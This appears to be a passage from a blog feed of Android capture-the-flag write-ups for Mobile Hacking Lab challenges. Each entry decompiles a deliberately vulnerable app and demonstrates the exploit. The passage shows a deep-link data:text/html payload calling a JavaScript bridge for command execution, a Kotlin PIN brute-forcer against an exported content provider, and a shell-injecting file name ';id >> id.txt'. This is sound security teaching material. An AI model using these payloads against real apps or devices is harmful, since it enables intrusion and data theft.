android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.guessme.WebviewActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;mhl\u0026#34; android:host=\u0026#34;mobilehackinglab\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; According to the AndroidManifest.xml, there\u0026rsquo;s an activity WebviewActivity where it has android:scheme and android:host. This is related to web URL and deep link where it should look something like mhl://mobilehackinglab.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_web); View findViewById = findViewById(R.id.webView); Intrinsics.checkNotNullExpressionValue(findViewById, \u0026#34;findViewById(...)\u0026#34;); this.webView = (WebView) findViewById; WebView webView = this.webView; WebView webView2 = null; if (webView == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView = null; } WebSettings webSettings = webView.getSettings(); Intrinsics.checkNotNullExpressionValue(webSettings, \u0026#34;getSettings(...)\u0026#34;); webSettings.setJavaScriptEnabled(true); WebView webView3 = this.webView; if (webView3 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView3 = null; } webView3.addJavascriptInterface(new MyJavaScriptInterface(), \u0026#34;AndroidBridge\u0026#34;); WebView webView4 = this.webView; if (webView4 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView4 = null; } webView4.setWebViewClient(new WebViewClient()); WebView webView5 = this.webView; if (webView5 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); } else { webView2 = webView5; } webView2.setWebChromeClient(new WebChromeClient()); loadAssetIndex(); handleDeepLink(getIntent()); } Moving on to the onCreate function in WebviewActivity activity, one thing important here is that the JavaScript is enabled. Aside from that, it will run loadAssetIndex() and handleDeepLink() function.\n1 2 3 4 5 6 7 8 private final void loadAssetIndex() { WebView webView = this.webView; if (webView == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView = null; } webView.loadUrl(\u0026#34;file:///android_asset/index.html\u0026#34;); } The loadAssetIndex() function basically just load the webView from the index.html\n1 2 3 4 5 6 7 8 9 10 private final void handleDeepLink(Intent intent) { Uri uri = intent != null ? intent.getData() : null; if (uri != null) { if (isValidDeepLink(uri)) { loadDeepLink(uri); } else { loadAssetIndex(); } } } As for the handleDeepLink() function, it will first check if there is an intent and the intent consist of any data. If there is data, it will go through isValidDeepLink() function and run loadDeepLink() function if the result is true.\n1 2 3 4 5 6 7 private final boolean isValidDeepLink(Uri uri) { if ((!Intrinsics.areEqual(uri.getScheme(), \u0026#34;mhl\u0026#34;) \u0026amp;\u0026amp; !Intrinsics.areEqual(uri.getScheme(), \u0026#34;https\u0026#34;)) || !Intrinsics.areEqual(uri.getHost(), \u0026#34;mobilehackinglab\u0026#34;)) { return false; } String queryParameter = uri.getQueryParameter(\u0026#34;url\u0026#34;); return queryParameter != null \u0026amp;\u0026amp; StringsKt.endsWith$default(queryParameter, \u0026#34;mobilehackinglab.com\u0026#34;, false, 2, (Object) null); } This isValidDeepLink() function basically check if the uri scheme is either mhl or https and the host is mobilehackinglab or not. If its correct, it will proceed on getting the query parameter uri via uri.getQueryParameter(\u0026quot;url\u0026quot;) and check if its end with mobilehackinglab.com. As for my current understanding, the deep link URL should look something like this, mhl://mobilehackinglab/?uri=mobilehackinglab.com.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 private final void loadDeepLink(Uri uri) { String fullUrl = String.valueOf(uri.getQueryParameter(\u0026#34;url\u0026#34;)); WebView webView = this.webView; WebView webView2 = null; if (webView == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView = null; } webView.loadUrl(fullUrl); WebView webView3 = this.webView; if (webView3 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); } else { webView2 = webView3; } webView2.reload(); } As for the loadDeepLink() function, it basically just get the URL from url query parameter and load into the webview.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public final class MyJavaScriptInterface { public MyJavaScriptInterface() { } @JavascriptInterface public final void loadWebsite(String url) { Intrinsics.checkNotNullParameter(url, \u0026#34;url\u0026#34;); WebView webView = WebviewActivity.this.webView; if (webView == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;webView\u0026#34;); webView = null; } webView.loadUrl(url); } @JavascriptInterface public final String getTime(String Time) { Intrinsics.checkNotNullParameter(Time, \u0026#34;Time\u0026#34;); try { Process process = Runtime.getRuntime().exec(Time); InputStream inputStream = process.getInputStream(); Intrinsics.checkNotNullExpressionValue(inputStream, \u0026#34;getInputStream(...)\u0026#34;); Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8); BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192); String readText = TextStreamsKt.readText(reader); reader.close(); return readText; } catch (Exception e) { return \u0026#34;Error getting time\u0026#34;; } } } This part of the Java code is to set up JavaScript where loadWebsite basically load the website from provided URL and getTime function basically getting time by running getRuntime().exec(Time). This part of the code looks vulnerable as it is executing command and the command is getting as the function input. Based on the existing information, I could perform RCE if I could run the JavaScript getTime in the webview.\nDynamic Analysis I started out by interacting with the application to test out if the deep link URL that I understand is correct or not.\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;mhl://mobilehackinglab\u0026#39; Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... } By using the adb command to run, it is possible to interact with the application.\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;mhl://mobilehackinglab/?url=mobilehackinglab.com\u0026#39; Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... } By providing the deep link mhl://mobilehackinglab/?url=mobilehackinglab.com, the application will open the website of mobilehackinglab.com instead of the default index.html. Now I just need to think of a method to inject my own URL into it.\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;mhl://mobilehackinglab/?url=https://callmeks.github.io/?test=mobilehackinglab.com\u0026#39; Starting: Intent { act=android.intent.action.VIEW dat=mhl://mobilehackinglab/... } I managed to load other other website by using the ?test which ignore the input behind while still having mobilehackinglab.com. By using this idea, I created an POC application to perform the RCE.\n1 2 3 4 5 6 7 8 9 10 11 @Composable fun test() { val intent = Intent().apply { setClassName( \u0026#34;com.mobilehackinglab.guessme\u0026#34;, \u0026#34;com.mobilehackinglab.guessme.WebviewActivity\u0026#34; ) setData(Uri.parse(\u0026#34;mhl://mobilehackinglab/?url=data:text/html,\u0026lt;script\u0026gt;document.write(AndroidBridge.getTime(\u0026#39;id\u0026#39;))\u0026lt;/script\u0026gt; mobilehackinglab.com\u0026#34;)) } LocalContext.current.startActivity(intent) } By using data:text/html, it will treat the code behind it as html instead of URL. By abusing this technique, it is possible to execute the JavaScript getTime('id') and perform RCE while remaining the mobilehackinglab.com at the end of the URL to meet the criteria.\nThings I learned from this challenge deep link to execute JavaScript function misconfiguration lead to RCE ","permalink":"https://callmeks.github.io/posts/mhl-guess-me/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the \u0026ldquo;Guess Me\u0026rdquo; Deep Link Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge revolves around a fictitious \u0026ldquo;Guess Me\u0026rdquo; app, shedding light on a critical security flaw related to deep links that can lead to remote code execution within the app\u0026rsquo;s framework.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/guessme.apk\"\u003eguessme.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eI started out by performing static analysis.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eAs usual, \u003ccode\u003ejadx-gui\u003c/code\u003e for reading the code.\u003c/p\u003e","title":"MHL Guess Me"},{"content":"Challenge Description Welcome to the Secure Notes Challenge! This lab immerses you in the intricacies of Android content providers, challenging you to crack a PIN code protected by a content provider within an Android application. It\u0026rsquo;s an excellent opportunity to explore Android\u0026rsquo;s data management and security features.\nsecurenote.apk\nSolution As usual, I start out by reading the code using static analysis\nStatic Analysis To read the apk code, I used jadx-gui.\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;provider android:name=\u0026#34;com.mobilehackinglab.securenotes.SecretDataProvider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;com.mobilehackinglab.securenotes.secretprovider\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.securenotes.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; I noticed that the provider has exported=true which mean I could just easily access the provider. I then look into the SecretDataProvider to have a look of the code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { Object m130constructorimpl; Intrinsics.checkNotNullParameter(uri, \u0026#34;uri\u0026#34;); MatrixCursor matrixCursor = null; if (selection == null || !StringsKt.startsWith$default(selection, \u0026#34;pin=\u0026#34;, false, 2, (Object) null)) { return null; } String removePrefix = StringsKt.removePrefix(selection, (CharSequence) \u0026#34;pin=\u0026#34;); try { StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE; String format = String.format(\u0026#34;%04d\u0026#34;, Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1)); Intrinsics.checkNotNullExpressionValue(format, \u0026#34;format(format, *args)\u0026#34;); try { Result.Companion companion = Result.INSTANCE; SecretDataProvider $this$query_u24lambda_u241 = this; m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format)); } catch (Throwable th) { Result.Companion companion2 = Result.INSTANCE; m130constructorimpl = Result.m130constructorimpl(ResultKt.createFailure(th)); } if (Result.m136isFailureimpl(m130constructorimpl)) { m130constructorimpl = null; } String secret = (String) m130constructorimpl; if (secret != null) { MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{\u0026#34;Secret\u0026#34;}); $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret}); matrixCursor = $this$query_u24lambda_u243_u24lambda_u242; } return matrixCursor; } catch (NumberFormatException e) { return null; } } Based on this partial code, this is content provider which works something like a SQL. based on the code, it seems to be looking for a 4 digit pin code and it has a query of pin=????. This mean that I could probably create some easy brute force attack to get the result. After understanding it, things will be easier as I don\u0026rsquo;t really need any other information as for now.\nDynamic Analysis After understanding it, I quickly created an POC apk to prove it is possible to read information from the content provider.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 @Composable fun Test1() { val context = LocalContext.current val contentUri = Uri.parse(\u0026#34;content://com.mobilehackinglab.securenotes.secretprovider\u0026#34;) val scope = CoroutineScope(Dispatchers.Default) repeat(10000) { number -\u0026gt; scope.launch { val format = String.format(\u0026#34;%04d\u0026#34;, number) val sqlquery = \u0026#34;pin=$format\u0026#34; Log.i(\u0026#34;yeet\u0026#34;,\u0026#34;now trying: $sqlquery\u0026#34;) context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor -\u0026gt; if (cursor.moveToFirst()) { val sb = StringBuilder() do { for (i in 0 until cursor.columnCount) { if (i \u0026gt; 0) sb.append(\u0026#34;, \u0026#34;) sb.append(\u0026#34;${cursor.getColumnName(i)} = ${cursor.getString(i)}\u0026#34;) } sb.append(\u0026#34;\\n\u0026#34;) } while (cursor.moveToNext()) Log.i(\u0026#34;yeet\u0026#34;,\u0026#34;$sqlquery ; $sb\u0026#34;) } } } } } Basically this kotlin code will easily interact with the content provider to perform brute force attack from 0 to 9999. The scope.launch is there to make the brute force attack to be slightly faster.\n1 2 3 \u0026lt;queries\u0026gt; \u0026lt;package android:name=\u0026#34;com.mobilehackinglab.securenotes\u0026#34; /\u0026gt; \u0026lt;/queries\u0026gt; It is required to add this queries if the android version is api 30 and above to communicate with the content provider.\n1 2025-03-31 23:14:11.516 26075-26115 yeet io.ks.mhlsecurenote I pin=2580 ; Secret = CTF{D1d_y0u_gu3ss_1t!1?} My POC code will print the output at log if there\u0026rsquo;s some interesting result.\nThings I learned from this challenge content provider brute force insecure / exported provider vulnerability ","permalink":"https://callmeks.github.io/posts/mhl-secure-notes/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Secure Notes Challenge! This lab immerses you in the intricacies of Android content providers, challenging you to crack a PIN code protected by a content provider within an Android application. It\u0026rsquo;s an excellent opportunity to explore Android\u0026rsquo;s data management and security features.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/securenotes.apk\"\u003esecurenote.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAs usual, I start out by reading the code using static analysis\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eTo read the apk code, I used \u003ccode\u003ejadx-gui\u003c/code\u003e.\u003c/p\u003e","title":"MHL Secure Notes"},{"content":"Challenge Description Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.\ncyclicscanner.apk\nSolution I started by performing static analysis to get an understanding on what the application is doing.\nStatic Analysis I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.cyclicscanner.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;service android:name=\u0026#34;com.mobilehackinglab.cyclicscanner.scanner.ScanService\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; I noticed that there\u0026rsquo;s a service named ScanService and it is not exported. I started out by reading the MainActivity code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) { Intrinsics.checkNotNullParameter(this$0, \u0026#34;this$0\u0026#34;); if (isChecked) { Toast.makeText(this$0, \u0026#34;Scan service started, your device will be scanned regularly.\u0026#34;, 0).show(); this$0.startForegroundService(new Intent(this$0, (Class\u0026lt;?\u0026gt;) ScanService.class)); return; } Toast.makeText(this$0, \u0026#34;Scan service cannot be stopped, this is for your own safety!\u0026#34;, 0).show(); ActivityMainBinding activityMainBinding = this$0.binding; if (activityMainBinding == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); activityMainBinding = null; } activityMainBinding.serviceSwitch.setChecked(true); } According to this function in MainActivity, it will start ScanService service after some checks.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @Override // android.os.Handler public void handleMessage(Message msg) { Intrinsics.checkNotNullParameter(msg, \u0026#34;msg\u0026#34;); try { System.out.println((Object) \u0026#34;starting file scan...\u0026#34;); File externalStorageDirectory = Environment.getExternalStorageDirectory(); Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, \u0026#34;getExternalStorageDirectory(...)\u0026#34;); Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null); for (Object element$iv : $this$forEach$iv) { File file = (File) element$iv; if (file.canRead() \u0026amp;\u0026amp; file.isFile()) { System.out.print((Object) (file.getAbsolutePath() + \u0026#34;...\u0026#34;)); boolean safe = ScanEngine.INSTANCE.scanFile(file); System.out.println((Object) (safe ? \u0026#34;SAFE\u0026#34; : \u0026#34;INFECTED\u0026#34;)); } } System.out.println((Object) \u0026#34;finished file scan!\u0026#34;); } catch (InterruptedException e) { Thread.currentThread().interrupt(); } Message $this$handleMessage_u24lambda_u241 = obtainMessage(); $this$handleMessage_u24lambda_u241.arg1 = msg.arg1; sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.SCAN_INTERVAL); } In the ScanService, it will trigger this handleMessage function after the onStartCommand function send message succesfully. In the handleMessage, it will get externals storage directory using Environment.getExternalStorageDirectory() and it will go through a for loop to get every files. Each of the files will go through this ScanEngine.INSTANCE.scanFile.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public final boolean scanFile(File file) { Intrinsics.checkNotNullParameter(file, \u0026#34;file\u0026#34;); try { String command = \u0026#34;toybox sha1sum \u0026#34; + file.getAbsolutePath(); Process process = new ProcessBuilder(new String[0]).command(\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start(); InputStream inputStream = process.getInputStream(); Intrinsics.checkNotNullExpressionValue(inputStream, \u0026#34;getInputStream(...)\u0026#34;); Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8); BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192); try { BufferedReader reader = bufferedReader; String output = reader.readLine(); Intrinsics.checkNotNull(output); Object fileHash = StringsKt.substringBefore$default(output, \u0026#34; \u0026#34;, (String) null, 2, (Object) null); Unit unit = Unit.INSTANCE; Closeable.closeFinally(bufferedReader, null); return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash); } finally { } } catch (Exception e) { e.printStackTrace(); return false; } } In the ScanEngine.INSTANCE.scanFile function, it is running bash command by using \u0026quot;toybox sha1sum\u0026quot; + file.getAbsolutePath() and it will pass to command(\u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, command). Looking into the code, it seems like it do not have any input validation or sanitization which mean I could perform RCE if I can just add a file with specific name in the external storage directory.\nDynamic Analysis After having a basic understanding from static analysis, I tried to play around with it and see how it works.\nHere\u0026rsquo;s the MainActivity where it has a button to enable the scanner. After clicking it, it only have a simple toast.\nAfter enabling it, look into the logcat.\n1 2 3 4 5 PS C:\\Users\\kskin\u0026gt; adb logcat System.out:I --pid=9717 ... 03-30 14:13:26.867 9717 10171 I System.out: /storage/emulated/0/Download/cacert.der...SAFE 03-30 14:13:26.898 9717 10171 I System.out: /storage/emulated/0/Music/.thumbnails/.database_uuid...SAFE ... Basically, it will go through a bunch of files from several directories such as Download and Music. I then tried to write a file with malicious name to perform RCE.\n1 2 3 4 1|beryllium:/sdcard/Download # echo \u0026#39;\u0026#39; \u0026gt; \u0026#39;;id \u0026gt;\u0026gt; id.txt\u0026#39; 1|beryllium:/sdcard/Download # ls -la total 24 -rw-rw---- 1 root everybody 1 2025-03-30 14:18 ;id\\ \u0026gt;\u0026gt;\\ id.txt After that, just wait for the result from logcat and see if it works.\n1 2 03-30 14:21:22.927 9717 10171 I System.out: /storage/emulated/0/Download/;id \u0026gt;\u0026gt; id.txt...SAFE 03-30 14:21:23.040 9717 10171 I System.out: /storage/emulated/0/id.txt...SAFE In the logcat, It managed to perform RCE and created another file named id.txt.\n1 2 3 4 5 6 7 8 9 beryllium:/sdcard # ls -la id.txt -rw-rw---- 1 root everybody 1176 2025-03-30 14:22 id.txt beryllium:/sdcard # cat id.txt uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 uid=10228(u0_a228) gid=10228(u0_a228) groups=10228(u0_a228),1077(external_storage),3003(inet),9997(everybody),20228(u0_a228_cache),50228(all_a228) context=u:r:untrusted_app:s0:c228,c256,c512,c768 According to the result, it can easily know that the code is vulnerable to RCE.\nThings I learned from this challenge adb logcat to read the specific log RCE in android code reading ","permalink":"https://callmeks.github.io/posts/mhl-cyclic-scanner/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/cyclicscanner.apk\"\u003ecyclicscanner.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eI started by performing static analysis to get an understanding on what the application is doing.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started out by looking into the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e after decompiling using \u003ccode\u003ejadx-gui\u003c/code\u003e.\u003c/p\u003e","title":"MHL Cyclic Scanner"},{"content":"Challenge Description Welcome to the Strings Challenge! In this lab,your goal is to find the flag. The flag\u0026rsquo;s format should be \u0026ldquo;MHL{\u0026hellip;}\u0026rdquo;. The challenge will give you a clear idea of how intents and intent filters work on android also you will get a hands-on experience using Frida APIs.\nStrings.apk\nSolution This is interesting challenge. I started with static analysis first.\nStatic Analysis As usual, I used jadx-gui to have a look at the source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.challenge.Activity2\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt; \u0026lt;data android:scheme=\u0026#34;mhl\u0026#34; android:host=\u0026#34;labs\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.challenge.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; After looking into the AndroidManifest.xml, I found 2 interesting activities which have exported=true. Activity2 has this intent-filter where it accept scheme=\u0026quot;mhl\u0026quot; and host=\u0026quot;labs\u0026quot;. Moving on, I looked into MainActivity source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public final class MainActivity extends AppCompatActivity { private ActivityMainBinding binding; public final native String stringFromJNI(); @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater()); Intrinsics.checkNotNullExpressionValue(inflate, \u0026#34;inflate(...)\u0026#34;); this.binding = inflate; ActivityMainBinding activityMainBinding = null; if (inflate == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); inflate = null; } setContentView(inflate.getRoot()); ActivityMainBinding activityMainBinding2 = this.binding; if (activityMainBinding2 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;binding\u0026#34;); } else { activityMainBinding = activityMainBinding2; } activityMainBinding.sampleText.setText(stringFromJNI()); } static { System.loadLibrary(\u0026#34;challenge\u0026#34;); } public final void KLOW() { SharedPreferences sharedPreferences = getSharedPreferences(\u0026#34;DAD4\u0026#34;, 0); SharedPreferences.Editor editor = sharedPreferences.edit(); Intrinsics.checkNotNullExpressionValue(editor, \u0026#34;edit(...)\u0026#34;); SimpleDateFormat sdf = new SimpleDateFormat(\u0026#34;dd/MM/yyyy\u0026#34;, Locale.getDefault()); String cu_d = sdf.format(new Date()); editor.putString(\u0026#34;UUU0133\u0026#34;, cu_d); editor.apply(); } } After reading the code, it use this System.loadLibrary which mean it is using a native library. The function from native library could be easily identified as it will have the strings native in the function. Based on what I understand, the native library basically providing a output or string. Moving to the KLOW function, it seems to be not used in the MainActivity. The code seems to be writing information into the shared preferences file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_2); SharedPreferences sharedPreferences = getSharedPreferences(\u0026#34;DAD4\u0026#34;, 0); String u_1 = sharedPreferences.getString(\u0026#34;UUU0133\u0026#34;, null); boolean isActionView = Intrinsics.areEqual(getIntent().getAction(), \u0026#34;android.intent.action.VIEW\u0026#34;); boolean isU1Matching = Intrinsics.areEqual(u_1, cd()); if (isActionView \u0026amp;\u0026amp; isU1Matching) { Uri uri = getIntent().getData(); if (uri != null \u0026amp;\u0026amp; Intrinsics.areEqual(uri.getScheme(), \u0026#34;mhl\u0026#34;) \u0026amp;\u0026amp; Intrinsics.areEqual(uri.getHost(), \u0026#34;labs\u0026#34;)) { String base64Value = uri.getLastPathSegment(); byte[] decodedValue = Base64.decode(base64Value, 0); if (decodedValue != null) { String ds = new String(decodedValue, Charsets.UTF_8); byte[] bytes = \u0026#34;your_secret_key_1234567890123456\u0026#34;.getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(bytes, \u0026#34;this as java.lang.String).getBytes(charset)\u0026#34;); String str = decrypt(\u0026#34;AES/CBC/PKCS5Padding\u0026#34;, \u0026#34;bqGrDKdQ8zo26HflRsGvVA==\u0026#34;, new SecretKeySpec(bytes, \u0026#34;AES\u0026#34;)); if (str.equals(ds)) { System.loadLibrary(\u0026#34;flag\u0026#34;); String s = getflag(); Toast.makeText(getApplicationContext(), s, 1).show(); return; } else { finishAffinity(); finish(); System.exit(0); return; } } finishAffinity(); finish(); System.exit(0); return; } finishAffinity(); finish(); System.exit(0); return; } finishAffinity(); finish(); System.exit(0); } As for the Activity2 activity, it has this onCreate function which will first check for the shared preferences file and make sure the information is same. After that, it will check for the incoming intent. It will first get the data from the intent and check if the data match the URI requirement (mhl,labs) and get the last part (getLastPathSegment) if its URI. After getting the last part, it will just base64 decode it and use it to compare with the result of the AES decryption. if the comparision is corect, it will load another native library and get a string or output from the library.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public final String decrypt(String algorithm, String cipherText, SecretKeySpec key) { Intrinsics.checkNotNullParameter(algorithm, \u0026#34;algorithm\u0026#34;); Intrinsics.checkNotNullParameter(cipherText, 